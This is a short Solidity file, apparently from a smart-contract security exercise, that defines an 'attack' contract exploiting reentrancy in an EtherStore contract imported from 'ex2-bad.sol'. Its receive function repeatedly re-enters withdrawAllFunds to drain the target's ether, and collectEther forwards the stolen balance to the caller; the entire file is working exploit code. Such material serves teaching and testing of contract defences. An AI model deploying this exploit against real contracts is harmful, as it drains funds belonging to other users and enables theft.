//SPDX-License-Identifier:  MIT
pragma solidity ^0.8.0;
import "./ex2-bad.sol";
//import "./ex2-good.sol";

contract attack{
	EtherStore public etherStore;
    
	constructor (address _etherStoreAddress){ 
		etherStore = EtherStore(_etherStoreAddress);
	}

	function attackEtherStore() public payable {
		require(msg.value >= 1 ether, "Require 1 ether in value");
		etherStore.depositFunds{value: 1 ether}();
		etherStore.withdrawAllFunds();
	}

	function collectEther() public {
		payable(msg.sender).transfer(address(this).balance);
	}

	receive () external payable {
		if (address(etherStore).balance > 1 ether) {
			etherStore.withdrawAllFunds();
		}
	}

}
